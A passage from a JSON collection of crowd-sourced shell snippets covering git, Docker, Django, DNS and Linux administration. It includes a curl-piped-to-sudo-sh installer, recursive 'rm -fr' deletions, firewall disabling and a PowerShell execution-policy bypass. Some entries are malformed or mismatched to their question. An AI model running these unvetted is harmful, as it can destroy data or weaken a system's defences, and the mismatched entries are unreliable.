    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n$ git push origin --delete feature/login \n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName  // refresh branch list git fetch -p\ngit branch -d <branch_name>\ngit push --delete remoteName branchName\ngit branch -r -d remoteBranchName\n",
    "reg_date": "2021-10-11T22:03:48.000Z"
  },
  {
    "id": 1253,
    "keyword": null,
    "link": null,
    "title": " delete remote git branch",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n$ git push origin --delete feature/login \ngit push --delete remoteName branchName\n#delete remote branch git push -d <remote_name> <branch_name> #example: git push -d origin new_feature  #delete local branch git branch -d <branch_name> #example: git branch -d new_feature\n$ git push <remote_name> :<branch_name>\ngit branch -d branch_namegit branch -D branch_name\n",
    "reg_date": "2021-10-11T22:03:48.000Z"
  },
  {
    "id": 1254,
    "keyword": null,
    "link": null,
    "title": " delete user centos 7 command line",
    "description": "sudo userdel username or sudo userdel -r username\nuserdel -r mynewuser\n",
    "reg_date": "2021-10-11T22:03:49.000Z"
  },
  {
    "id": 1255,
    "keyword": null,
    "link": null,
    "title": " delete vscode mac",
    "description": "rm -fr ~/Library/Preferences/com.microsoft.VSCode.helper.plist  rm -fr ~/Library/Preferences/com.microsoft.VSCode.plist  rm -fr ~/Library/Caches/com.microsoft.VSCode rm -fr ~/Library/Caches/com.microsoft.VSCode.ShipIt/ rm -fr ~/Library/Application\\ Support/Code/ rm -fr ~/Library/Saved\\ Application\\ State/com.microsoft.VSCode.savedState/ rm -fr ~/.vscode/ rm -rf ~/.vscode*\n",
    "reg_date": "2021-10-11T22:03:49.000Z"
  },
  {
    "id": 1256,
    "keyword": null,
    "link": null,
    "title": " deno install ubuntu",
    "description": "curl -fsSL https://deno.land/x/install/install.sh | sudo DENO_INSTALL=/usr/local sh\n",
    "reg_date": "2021-10-11T22:03:50.000Z"
  },
  {
    "id": 1257,
    "keyword": null,
    "link": null,
    "title": " deny directory listing htaccess",
    "description": "# Place the following in your .htaccess at doc root Options -Indexes\n",
    "reg_date": "2021-10-11T22:03:50.000Z"
  },
  {
    "id": 1258,
    "keyword": null,
    "link": null,
    "title": " deploy functions firebase",
    "description": "$ firebase deploy --only functions\nfirebase deploy --only functions:functionNameHere\nfirebase deploy --only functions:function1Name,functions:function2Name\n",
    "reg_date": "2021-10-11T22:03:50.000Z"
  },
  {
    "id": 1259,
    "keyword": null,
    "link": null,
    "title": " desktop trigger click bash shell ubuntu",
    "description": "Open a Terminal cd into the directory where the file is found. Type chmod ugo+x filename. This will set the file to execute.\n",
    "reg_date": "2021-10-11T22:03:51.000Z"
  },
  {
    "id": 1260,
    "keyword": null,
    "link": null,
    "title": " determine nginx version",
    "description": "nginx -v\n",
    "reg_date": "2021-10-11T22:03:51.000Z"
  },
  {
    "id": 1261,
    "keyword": null,
    "link": null,
    "title": " device or resource busy",
    "description": "lsof +D /path kill -9 $PID\n",
    "reg_date": "2021-10-11T22:03:51.000Z"
  },
  {
    "id": 1262,
    "keyword": null,
    "link": null,
    "title": " dexie nuxt",
    "description": "yarn add dexie \nnpm install dexie \n",
    "reg_date": "2021-10-11T22:03:51.000Z"
  },
  {
    "id": 1263,
    "keyword": null,
    "link": null,
    "title": " different region in ngrok",
    "description": "# ngrok supported region:  # where is one of:  # us - United States (Ohio) # eu - Europe (Frankfurt) # ap - Asia/Pacific (Singapore) # au - Australia (Sydney) # sa - South America (Sao Paulo) # jp - Japan (Tokyo) # in - India (Mumbai)  # command :  ngrok http -region=in 80\n",
    "reg_date": "2021-10-11T22:03:51.000Z"
  },
  {
    "id": 1264,
    "keyword": null,
    "link": null,
    "title": " digitally signed react native",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:03:52.000Z"
  },
  {
    "id": 1265,
    "keyword": null,
    "link": null,
    "title": " directory diff",
    "description": "diff -qr dir1/ dir2/\n",
    "reg_date": "2021-10-11T22:03:52.000Z"
  },
  {
    "id": 1266,
    "keyword": null,
    "link": null,
    "title": " direnv",
    "description": "# Install # Debian apt-get install direnv  # Hooks # Bash echo 'eval \"$(direnv hook bash)\"' >> ~/.bashrc # ZSH echo 'eval \"$(direnv hook zsh)\"' >> ~/.zshrc\n",
    "reg_date": "2021-10-11T22:03:52.000Z"
  },
  {
    "id": 1267,
    "keyword": null,
    "link": null,
    "title": " diretcory size linux",
    "description": "du -sh file_path\n",
    "reg_date": "2021-10-11T22:03:52.000Z"
  },
  {
    "id": 1268,
    "keyword": null,
    "link": null,
    "title": " disable hiberfil.sys",
    "description": "//To remove hiberfil.sys (turn off Windows Hibernation) //run the following command as administrator: powercfg.exe -h off\n",
    "reg_date": "2021-10-11T22:03:52.000Z"
  },
  {
    "id": 1269,
    "keyword": null,
    "link": null,
    "title": " disable ssh login for user",
    "description": "# To deny SSH access to specific user called &ldquo;sk&rdquo;, edit sshd_config file: $ sudo vi /etc/ssh/sshd_config  # Add/edit the following line in sshd_config file. DenyUsers sk  # Deny SSH access to multiple users, specify the usernames with space separated as shown below. DenyUsers sk ostechnix  # Deny SSH access to an entire group, for example root, add: DenyGroups root  # Save and quit the ssh config file. Restart ssh service to take effect the changes. $ sudo systemctl restart sshd\n$ sudo vi /etc/ssh/sshd_config   ChallengeResponseAuthentication no PasswordAuthentication no\n",
    "reg_date": "2021-10-11T22:03:52.000Z"
  },
  {
    "id": 1270,
    "keyword": null,
    "link": null,
    "title": " disable ubuntu firewall",
    "description": "sudo ufw enable sudo ufw disable \n$ sudo ufw disable Firewall stopped and disabled on system startup \nManaging UFW from command line UFW ( Uncomplicated Firewall ) firewall is a default firewall on Ubuntu 18.04 Bionic Beaver Linux. Check a current firewall status By default the UFW is disabled. You can check the status of your firewall by executing the following linux command:  $ sudo ufw status [sudo] password for linuxconfig:  Status: inactive  For more verbose output append word verbose to the above command:  $ sudo ufw status verbose  Enable Firewall To enable firewall execute:  $ sudo ufw enable Command may disrupt existing ssh connections. Proceed with operation (y|n)? y Firewall is active and enabled on system startup  Firewall, is now enabled:  $ sudo ufw status Status: active  \n",
    "reg_date": "2021-10-11T22:03:52.000Z"
  },
  {
    "id": 1271,
    "keyword": null,
    "link": null,
    "title": " disable ufw",
    "description": "$ sudo ufw disable Firewall stopped and disabled on system startup \nManaging UFW from command line UFW ( Uncomplicated Firewall ) firewall is a default firewall on Ubuntu 18.04 Bionic Beaver Linux. Check a current firewall status By default the UFW is disabled. You can check the status of your firewall by executing the following linux command:  $ sudo ufw status [sudo] password for linuxconfig:  Status: inactive  For more verbose output append word verbose to the above command:  $ sudo ufw status verbose  Enable Firewall To enable firewall execute:  $ sudo ufw enable Command may disrupt existing ssh connections. Proceed with operation (y|n)? y Firewall is active and enabled on system startup  Firewall, is now enabled:  $ sudo ufw status Status: active  \n$ sudo ufw status Status: inactive \n",
    "reg_date": "2021-10-11T22:03:53.000Z"
  },
  {
    "id": 1272,
    "keyword": null,
    "link": null,
    "title": " discord on linux",
    "description": "sudo snap install discord\nsnap install discord\n",
    "reg_date": "2021-10-11T22:03:53.000Z"
  },
  {
    "id": 1273,
    "keyword": null,
    "link": null,
    "title": " display contents of file ubuntu",
    "description": "less fileName or cat fileName \ncat filename #for short files less filename #for longer files \n",
    "reg_date": "2021-10-11T22:03:53.000Z"
  },
  {
    "id": 1274,
    "keyword": null,
    "link": null,
    "title": " display file size in mb in linux",
    "description": "prashad@ubuntu:~/working_dir/opencv$ ls -lh CMakeLists.txt -rw-r--r-- 1 prashad prashad 65M Sep 29 01:05 CMakeLists.txt prashad@ubuntu:~/working_dir/opencv$    NOTE: To display the file sizes in units like 7K, 5M, 8.2G, etc&hellip; use the -lh option with  ls.  \"ls -lh\"\n",
    "reg_date": "2021-10-11T22:03:53.000Z"
  },
  {
    "id": 1275,
    "keyword": null,
    "link": null,
    "title": " display ip address linux",
    "description": "#private ip hostname -I or ifconfig or ip addr show  #public ip curl ifconfig.me\nifconfig -a\n$ hostname -I  \n",
    "reg_date": "2021-10-11T22:03:54.000Z"
  },
  {
    "id": 1276,
    "keyword": null,
    "link": null,
    "title": " display nginx logs",
    "description": "tail -f /var/log/nginx/error.log\n",
    "reg_date": "2021-10-11T22:03:54.000Z"
  },
  {
    "id": 1277,
    "keyword": null,
    "link": null,
    "title": " display number of lines in nano linux",
    "description": "nano --linenumbers [filename]\nPress  Alt+#  or Alt+Shift+3\n",
    "reg_date": "2021-10-11T22:03:54.000Z"
  },
  {
    "id": 1278,
    "keyword": null,
    "link": null,
    "title": " django-cors-headers",
    "description": "$ pipenv install django-cors-headers # or $ pip install django-cors-headers\nMIDDLEWARE = [     ...     'corsheaders.middleware.CorsMiddleware',     'django.middleware.common.CommonMiddleware',     ... ]\nCORS_ALLOWED_ORIGINS = [     \"https://example.com\",     \"https://sub.example.com\",     \"http://localhost:8080\",     \"http://127.0.0.1:9000\" ]\npython -m pip install django-cors-headers\nCORS_ORIGIN_WHITELIST = (     'google.com',     'hostname.example.com' )\nINSTALLED_APPS = [     ...     'corsheaders',     ... ]\n",
    "reg_date": "2021-10-11T22:03:54.000Z"
  },
  {
    "id": 1279,
    "keyword": null,
    "link": null,
    "title": " django.core.exceptions.ImproperlyConfigured: Error loading MySQLdb module. Did you install mysqlclient?",
    "description": "sudo apt-get install libmysqlclient-dev sudo apt-get install libssl-dev pip install mysqlclient  #for Debian su apt install libmysqlclient-dev su apt install libssl-dev pip install mysqlclient\n//For Mysql sudo apt-get install libmysqlclient-dev  //If you are using MariaDB sudo apt-get install libmariadbclient-dev  pip install mysqlclient  /* \tIf you are getting a error like     error: command 'x86_64-linux-gnu-gcc' failed with exit status 1     then :  */ sudo apt-get install python3-dev  //Then  pip install mysqlclient\npip install pymysql \npip3 install http://cdn.mysql.com/Downloads/Connector-Python/mysql-connector-python-2.0.4.zip\nimport pymysql  pymysql.install_as_MySQLdb() \n File \"C:\\Users\\user\\env\\lib\\site-packages\\django\\db\\backends\\mysql\\base.py\", line 30, in <module>     'Did you install mysqlclient or MySQL-python?' % e django.core.exceptions.ImproperlyConfigured: Error loading MySQLdb module: No module named 'MySQLdb'. Did you install mysqlclient or MySQL-python? \n",
    "reg_date": "2021-10-11T22:03:54.000Z"
  },
  {
    "id": 1280,
    "keyword": null,
    "link": null,
    "title": " django allauth",
    "description": "1. pip install django-allauth  2. INSTALLED_APPS = [       'django.contrib.auth',       'django.contrib.messages',       'django.contrib.sites',        'allauth',       'allauth.account',       'allauth.socialaccount', \t]  3.\tAUTHENTICATION_BACKENDS = [       'django.contrib.auth.backends.ModelBackend',       'allauth.account.auth_backends.AuthenticationBackend', \t]  4. SITE_ID = 1  5. urlpatterns = [      path('accounts/', include('allauth.urls')), ]\npip install django-allauth \nSOCIALACCOUNT_PROVIDERS = {     'google': {         # For each OAuth based provider, either add a ``SocialApp``         # (``socialaccount`` app) containing the required client         # credentials, or list them here:         'APP': {             'client_id': '123',             'secret': '456',             'key': ''         }     } }\n",
    "reg_date": "2021-10-11T22:03:54.000Z"
  },
  {
    "id": 1281,
    "keyword": null,
    "link": null,
    "title": " django filters install",
    "description": "$ pip install django-filter \nINSTALLED_APPS = [     ...     'django_filters', ] \nimport django_filters  class ProductFilter(django_filters.FilterSet):   \t# lookup_expr='iexact'     # lookup_expr='icontains'     name = django_filters.CharFilter(lookup_expr='iexact')      class Meta:         model = Product         fields = ['price', 'release_date'] \n",
    "reg_date": "2021-10-11T22:03:55.000Z"
  },
  {
    "id": 1282,
    "keyword": null,
    "link": null,
    "title": " django gitignore",
    "description": " ### Django ### *.log *.pot *.pyc __pycache__/ local_settings.py db.sqlite3 media/ staticfiles/  # Backup files #  *.bak   ### Django.Python Stack ### *.py[cod] *$py.class  # C extensions *.so  # Distribution / packaging .Python build/ develop-eggs/ dist/ downloads/ eggs/ .eggs/ lib/ lib64/ parts/ sdist/ var/ wheels/ share/python-wheels/ *.egg-info/ .installed.cfg *.egg .Python build/  MANIFEST   # PyInstaller #  Usually these files are written by a python script from a template #  before PyInstaller builds the exe, so as to inject date/other infos into it. *.manifest *.spec  # Installer logs pip-log.txt pip-delete-this-directory.txt  # Unit test / coverage reports htmlcov/ .tox/ .nox/ .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover *.py,cover .hypothesis/ .pytest_cache/ cover/    # Translations *.mo  # pyenv  .python-version   # PEP 582; used by e.g. github.com/David-OConnor/pyflow __pypackages__/   # SageMath parsed files *.sage.py  # Environments .env .venv env/ venv/ ENV/ env.bak/ venv.bak/  # mkdocs documentation  /site   # mypy .mypy_cache/ .dmypy.json dmypy.json  # Pyre type checker .pyre/  # pytype static type analyzer .pytype/  # Cython debug symbols cython_debug/  # Visual Studio Code #  .vscode/*  !.vscode/settings.json  !.vscode/tasks.json  !.vscode/launch.json  !.vscode/extensions.json  .history \n# Django # *.log *.pot *.pyc __pycache__ db.sqlite3 media  # Backup files #  *.bak   # If you are using PyCharm #  .idea/**/workspace.xml  .idea/**/tasks.xml  .idea/dictionaries  .idea/**/dataSources/  .idea/**/dataSources.ids  .idea/**/dataSources.xml  .idea/**/dataSources.local.xml  .idea/**/sqlDataSources.xml  .idea/**/dynamic.xml  .idea/**/uiDesigner.xml  .idea/**/gradle.xml  .idea/**/libraries  *.iws /out/   # Python #  *.py[cod]  *$py.class   # Distribution / packaging  .Python build/  develop-eggs/  dist/  downloads/  eggs/  .eggs/  lib/  lib64/  parts/  sdist/  var/  wheels/  *.egg-info/  .installed.cfg  *.egg  *.manifest  *.spec   # Installer logs  pip-log.txt  pip-delete-this-directory.txt   # Unit test / coverage reports  htmlcov/  .tox/  .coverage  .coverage.*  .cache  .pytest_cache/  nosetests.xml  coverage.xml  *.cover  .hypothesis/   # Jupyter Notebook  .ipynb_checkpoints   # pyenv  .python-version   # celery  celerybeat-schedule.*   # SageMath parsed files  *.sage.py   # Environments  .env  .venv  env/  venv/  ENV/  env.bak/  venv.bak/   # mkdocs documentation  /site   # mypy  .mypy_cache/   # Sublime Text #  *.tmlanguage.cache  *.tmPreferences.cache  *.stTheme.cache  *.sublime-workspace  *.sublime-project   # sftp configuration file  sftp-config.json   # Package control specific files Package  Control.last-run  Control.ca-list  Control.ca-bundle  Control.system-ca-bundle  GitHub.sublime-settings   # Visual Studio Code #  .vscode/*  !.vscode/settings.json  !.vscode/tasks.json  !.vscode/launch.json  !.vscode/extensions.json  .history \n # Byte-compiled / optimized / DLL files __pycache__/ *.py[cod] *$py.class  # C extensions *.so  # Distribution / packaging .Python env/ build/ develop-eggs/ dist/ downloads/ eggs/ .eggs/ lib/ lib64/ parts/ sdist/ var/ wheels/ *.egg-info/ .installed.cfg *.egg  # PyInstaller #  Usually these files are written by a python script from a template #  before PyInstaller builds the exe, so as to inject date/other infos into it. *.manifest *.spec  # Installer logs pip-log.txt pip-delete-this-directory.txt  # Unit test / coverage reports htmlcov/ .tox/ .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover .hypothesis/  # Translations *.mo *.pot  # Django stuff: *.log local_settings.py  # Flask stuff: instance/ .webassets-cache  # Scrapy stuff: .scrapy  # Sphinx documentation docs/_build/  # PyBuilder target/  # Jupyter Notebook .ipynb_checkpoints  # pyenv .python-version  # celery beat schedule file celerybeat-schedule  # SageMath parsed files *.sage.py  # dotenv .env  # virtualenv .venv venv/ ENV/ .vscode # Spyder project settings .spyderproject .spyproject  # Rope project settings .ropeproject  # mkdocs documentation /site  # mypy .mypy_cache/  .DS_Store *.sqlite3 media/ *.pyc *.db *.pid  # Ignore Django Migrations in Development if you are working on team  # Only for Development only # **/migrations/** # !**/migrations # !**/migrations/__init__.py\n# Django # *.log *.pot *.pyc __pycache__ db.sqlite3 media  # Backup files #  *.bak   # If you are using PyCharm #  .idea/**/workspace.xml  .idea/**/tasks.xml  .idea/dictionaries  .idea/**/dataSources/  .idea/**/dataSources.ids  .idea/**/dataSources.xml  .idea/**/dataSources.local.xml  .idea/**/sqlDataSources.xml  .idea/**/dynamic.xml  .idea/**/uiDesigner.xml  .idea/**/gradle.xml  .idea/**/libraries  *.iws /out/   # Python #  *.py[cod]  *$py.class   # Distribution / packaging  .Python build/  develop-eggs/  dist/  downloads/  eggs/  .eggs/  lib/  lib64/  parts/  sdist/  var/  wheels/  *.egg-info/  .installed.cfg  *.egg  *.manifest  *.spec   # Installer logs  pip-log.txt  pip-delete-this-directory.txt   # Unit test / coverage reports  htmlcov/  .tox/  .coverage  .coverage.*  .cache  .pytest_cache/  nosetests.xml  coverage.xml  *.cover  .hypothesis/   # Jupyter Notebook  .ipynb_checkpoints   # pyenv  .python-version   # celery  celerybeat-schedule.*   # SageMath parsed files  *.sage.py   # Environments  .env  .venv  env/  venv/  ENV/  env.bak/  venv.bak/   # mkdocs documentation  /site   # mypy  .mypy_cache/   # Sublime Text #  *.tmlanguage.cache  *.tmPreferences.cache  *.stTheme.cache  *.sublime-workspace  *.sublime-project   # sftp configuration file  sftp-config.json   # Package control specific files Package  Control.last-run  Control.ca-list  Control.ca-bundle  Control.system-ca-bundle  GitHub.sublime-settings   # Visual Studio Code #  .vscode/*  !.vscode/settings.json  !.vscode/tasks.json  !.vscode/launch.json  !.vscode/extensions.json  .history\n # Created by https://www.toptal.com/developers/gitignore/api/django # Edit at https://www.toptal.com/developers/gitignore?templates=django  ### Django ### *.log *.pot *.pyc __pycache__/ local_settings.py db.sqlite3 db.sqlite3-journal media  # If your build process includes running collectstatic, then you probably don't need or want to include staticfiles/ # in your Git repository. Update and uncomment the following line accordingly. # <django-project-name>/staticfiles/  ### Django.Python Stack ### # Byte-compiled / optimized / DLL files *.py[cod] *$py.class  # C extensions *.so  # Distribution / packaging .Python build/ develop-eggs/ dist/ downloads/ eggs/ .eggs/ lib/ lib64/ parts/ sdist/ var/ wheels/ share/python-wheels/ *.egg-info/ .installed.cfg *.egg MANIFEST  # PyInstaller #  Usually these files are written by a python script from a template #  before PyInstaller builds the exe, so as to inject date/other infos into it. *.manifest *.spec  # Installer logs pip-log.txt pip-delete-this-directory.txt  # Unit test / coverage reports htmlcov/ .tox/ .nox/ .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover *.py,cover .hypothesis/ .pytest_cache/ cover/  # Translations *.mo  # Django stuff:  # Flask stuff: instance/ .webassets-cache  # Scrapy stuff: .scrapy  # Sphinx documentation docs/_build/  # PyBuilder .pybuilder/ target/  # Jupyter Notebook .ipynb_checkpoints  # IPython profile_default/ ipython_config.py  # pyenv #   For a library or package, you might want to ignore these files since the code is #   intended to run in multiple environments; otherwise, check them in: # .python-version  # pipenv #   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control. #   However, in case of collaboration, if having platform-specific dependencies or dependencies #   having no cross-platform support, pipenv may install dependencies that don't work, or not #   install all needed dependencies. #Pipfile.lock  # PEP 582; used by e.g. github.com/David-OConnor/pyflow __pypackages__/  # Celery stuff celerybeat-schedule celerybeat.pid  # SageMath parsed files *.sage.py  # Environments .env .venv env/ venv/ ENV/ env.bak/ venv.bak/  # Spyder project settings .spyderproject .spyproject  # Rope project settings .ropeproject  # mkdocs documentation /site  # mypy .mypy_cache/ .dmypy.json dmypy.json  # Pyre type checker .pyre/  # pytype static type analyzer .pytype/  # Cython debug symbols cython_debug/  # End of https://www.toptal.com/developers/gitignore/api/django \n",
    "reg_date": "2021-10-11T22:03:55.000Z"
  },
  {
    "id": 1283,
    "keyword": null,
    "link": null,
    "title": " dnf epel-release redhat",
    "description": "$ sudo dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm \n",
    "reg_date": "2021-10-11T22:03:55.000Z"
  },
  {
    "id": 1284,
    "keyword": null,
    "link": null,
    "title": " dns flush",
    "description": "ipconfig /flushdns\nDont flush your dns too much, or your wifi might get worse\n/etc/init.d/nscd restart\nsudo lookupd -flushcache\nsudo killall -HUP mDNSResponder\nsudo dscacheutil -flushcache\n",
    "reg_date": "2021-10-11T22:03:55.000Z"
  },
  {
    "id": 1285,
    "keyword": null,
    "link": null,
    "title": " dns flush command",
    "description": "sudo systemd-resolve --flush-caches\nipconfig /flushdns\nsudo systemd-resolve --flush-caches sudo systemd-resolve --statistics sudo /etc/init.d/dns-clean start\nDont flush your dns too much, or your wifi might get worse\n/etc/init.d/nscd restart\nsudo lookupd -flushcache\n",
    "reg_date": "2021-10-11T22:03:55.000Z"
  },
  {
    "id": 1286,
    "keyword": null,
    "link": null,
    "title": " dns flush windows",
    "description": "ipconfig /flushdns\nsudo lookupd -flushcache\nsudo killall -HUP mDNSResponder\nsudo dscacheutil -flushcache\nsudo discoveryutil udnsflushcaches\n",
    "reg_date": "2021-10-11T22:03:56.000Z"
  },
  {
    "id": 1287,
    "keyword": null,
    "link": null,
    "title": " dns flush windows 10",
    "description": "ipconfig /flushdns\n",
    "reg_date": "2021-10-11T22:03:56.000Z"
  },
  {
    "id": 1288,
    "keyword": null,
    "link": null,
    "title": " do a chechsum verification from command prompt",
    "description": "C:\\user\\somepath> certutil -hashfile helloworld.txt md5\n",
    "reg_date": "2021-10-11T22:03:56.000Z"
  },
  {
    "id": 1289,
    "keyword": null,
    "link": null,
    "title": " do a git clone with user name and password",
    "description": "git clone https://username:password@github.com/username/repository.git  or  git clone https://username@github.com/username/repository.git It will prompt you for your password.   \n",
    "reg_date": "2021-10-11T22:03:56.000Z"
  },
  {
    "id": 1290,
    "keyword": null,
    "link": null,
    "title": " do you need to install type definitions for node",
    "description": "npm install @types/node --save-dev \n",
    "reg_date": "2021-10-11T22:03:56.000Z"
  },
  {
    "id": 1291,
    "keyword": null,
    "link": null,
    "title": " docekr enter container",
    "description": "docker exec -it [container-id] bash\n",
    "reg_date": "2021-10-11T22:03:57.000Z"
  },
  {
    "id": 1292,
    "keyword": null,
    "link": null,
    "title": " docker: Error response from daemon: dial unix docker.raw.sock: connect: no such file or directory",
    "description": "// Stop and Start Docker daemon sudo /etc/init.d/docker stop sudo /etc/init.d/docker start // If the above does not work try with: sudo reboot\n",
    "reg_date": "2021-10-11T22:03:57.000Z"
  },
  {
    "id": 1293,
    "keyword": null,
    "link": null,
    "title": " docker-compose container list",
    "description": "docker-compose ls\ndocker-compose ps\n",
    "reg_date": "2021-10-11T22:03:57.000Z"
  },
  {
    "id": 1294,
    "keyword": null,
    "link": null,
    "title": " docker-compose force rebuild",
    "description": "# Build images before starting containers. docker-compose up --build # Recreate containers even if configuration/image hasn't changed. docker-compose up --force-recreate\ndocker build --no-cache -t u12_core -f u12_core . \n",
    "reg_date": "2021-10-11T22:03:57.000Z"
  },
  {
    "id": 1295,
    "keyword": null,
    "link": null,
    "title": " docker-compose install centos 8",
    "description": "sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose\n# download sudo curl -L \"https://github.com/docker/compose/releases/download/1.26.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose  # creare simlink sudo chmod +x /usr/local/bin/docker-compose  sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose  # done docker-compose -v\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.26.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose\nsudo curl -L https://github.com/docker/compose/releases/download/1.21.0/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose  sudo chmod +x /usr/local/bin/docker-compose  # After you do the curl command , it'll put docker-compose into the /usr/local/bin  #which is not on the PATH. To fix it, create a symbolic link:  sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose #And now if you do: docker-compose --version  #You'll see that docker-compose is now on the PATH\n",
    "reg_date": "2021-10-11T22:03:57.000Z"
  },
  {
    "id": 1296,
    "keyword": null,
    "link": null,
    "title": " docker-compose prevent exit",
    "description": "command: tail -F anything\ndocker compose stop  $ docker container stop [OPTIONS] CONTAINER [CONTAINER...]\n",
    "reg_date": "2021-10-11T22:03:57.000Z"
  },
  {
    "id": 1297,
    "keyword": null,
    "link": null,
    "title": " docker-machine create digitalocean",
    "description": "docker-machine create --digitalocean-size \"s-2vcpu-4gb\" --driver digitalocean --digitalocean-access-token PERSONAL_ACCESS_TOKEN name-droplet-here\n",
    "reg_date": "2021-10-11T22:03:58.000Z"
  },
  {
    "id": 1298,
    "keyword": null,
    "link": null,
    "title": " docker-machine install mac brew",
    "description": "brew install docker docker-machine\n",
    "reg_date": "2021-10-11T22:03:58.000Z"
  },
  {
    "id": 1299,
    "keyword": null,
    "link": null,
    "title": " docker     Problem with the CMake installation, aborting build. CMake executable is cmake",
    "description": "For alpine linux - run:  apk add cmake  For debian/ubuntu - run:  apt-get install cmake  For redhat/fedora/centos - run:  yum install cmake \n",
    "reg_date": "2021-10-11T22:03:58.000Z"
  },
  {
    "id": 1300,
    "keyword": null,
    "link": null,
    "title": " docker clean logs",
    "description": "truncate -s 0 /var/lib/docker/containers/*/*-json.log; \n",
    "reg_date": "2021-10-11T22:03:58.000Z"
  },
  {
    "id": 1301,
    "keyword": null,
    "link": null,
    "title": " docker clean unused images",
    "description": "$ docker image prune -a  WARNING! This will remove all images without at least one container associated to them. Are you sure you want to continue? [y/N] y Deleted Images: untagged: alpine:latest untagged: alpine@sha256:3dcdb92d7432d56604d4545cbd324b14e647b313626d99b889d0626de158f73a deleted: sha256:4e38e38c8ce0b8d9041a9c4fefe786631d1416225e13b0bfe8cfa2321aec4bba deleted: sha256:4fe15f8d0ae69e169824f25f1d4da3015a48feeeeebb265cd2e328e15c6a869f untagged: alpine:3.3 untagged: alpine@sha256:4fa633f4feff6a8f02acfc7424efd5cb3e76686ed3218abf4ca0fa4a2a358423 untagged: my-jq:latest deleted: sha256:ae67841be6d008a374eff7c2a974cde3934ffe9536a7dc7ce589585eddd83aff deleted: sha256:34f6f1261650bc341eb122313372adc4512b4fceddc2a7ecbb84f0958ce5ad65 deleted: sha256:cf4194e8d8db1cb2d117df33f2c75c0369c3a26d96725efb978cc69e046b87e7 untagged: my-curl:latest deleted: sha256:b2789dd875bf427de7f9f6ae001940073b3201409b14aba7e5db71f408b8569e deleted: sha256:96daac0cb203226438989926fc34dd024f365a9a8616b93e168d303cfe4cb5e9 deleted: sha256:5cbd97a14241c9cd83250d6b6fc0649833c4a3e84099b968dd4ba403e609945e deleted: sha256:a0971c4015c1e898c60bf95781c6730a05b5d8a2ae6827f53837e6c9d38efdec deleted: sha256:d8359ca3b681cc5396a4e790088441673ed3ce90ebc04de388bfcd31a0716b06 deleted: sha256:83fc9ba8fb70e1da31dfcc3c88d093831dbd4be38b34af998df37e8ac538260c deleted: sha256:ae7041a4cc625a9c8e6955452f7afe602b401f662671cea3613f08f3d9343b35 deleted: sha256:35e0f43a37755b832f0bbea91a2360b025ee351d7309dae0d9737bc96b6d0809 deleted: sha256:0af941dd29f00e4510195dd00b19671bc591e29d1495630e7e0f7c44c1e6a8c0 deleted: sha256:9fc896fc2013da84f84e45b3096053eb084417b42e6b35ea0cce5a3529705eac deleted: sha256:47cf20d8c26c46fff71be614d9f54997edacfe8d46d51769706e5aba94b16f2b deleted: sha256:2c675ee9ed53425e31a13e3390bf3f539bf8637000e4bcfbb85ee03ef4d910a1  Total reclaimed space: 16.43 MB \n$ docker rmi $(docker images -q -f dangling=true)\n$ docker volume prune  WARNING! This will remove all volumes not used by at least one container. Are you sure you want to continue? [y/N] y \n",
    "reg_date": "2021-10-11T22:03:58.000Z"
  },
  {
    "id": 1302,
    "keyword": null,
    "link": null,
    "title": " docker clear cache",
    "description": "# Rebuild the image docker build --no-cache  # Pull the base images again and rebuild docker build --no-cache --pull  # Also works with docker-compose docker-compose build --no-cache  # If nothing from the above works for you, you could also prune everything docker system to prune\n",
    "reg_date": "2021-10-11T22:03:58.000Z"
  },
  {
    "id": 1303,
    "keyword": null,
    "link": null,
    "title": " docker compose down",
    "description": "# Stop services only docker-compose stop  # Stop and remove containers, networks.. docker-compose down -f <file>  # Down and remove volumes docker-compose down --volumes   # Down and remove images docker-compose down --rmi <all|local>  \n",
    "reg_date": "2021-10-11T22:03:58.000Z"
  },
  {
    "id": 1304,
    "keyword": null,
    "link": null,
    "title": " docker copy files from container to host",
    "description": "docker cp <containerId>:/file/path/within/container /host/path/target \ndocker cp <containerId>:/file/path/within/container /host/path/target\ndocker cp foo.txt mycontainer:/foo.txt \ndocker cp foo.txt mycontainer:/foo.txt\n",
    "reg_date": "2021-10-11T22:03:59.000Z"
  },
  {
    "id": 1305,
    "keyword": null,
    "link": null,
    "title": " docker daemon is not running",
    "description": "Net stop com.docker.service Net start com.docker.service \nOpen powershell as admin and use : & 'C:\\Program Files\\Docker\\Docker\\DockerCli.exe' -SwitchDaemon\nIf HTCondor daemons are currently running, but need to be killed and  newly invoked, the condor_restart tool does this. This would be the  case for a new value of a configuration variable for which using  condor_reconfig is inadequate.  To restart all daemons on all machines in the pool,    condor_restart -all To restart all daemons on a single machine in the pool,    condor_restart <hostname> where <hostname> is replaced by the host name of the machine to be restarted.\n",
    "reg_date": "2021-10-11T22:03:59.000Z"
  },
  {
    "id": 1306,
    "keyword": null,
    "link": null,
    "title": " docker delete all containers",
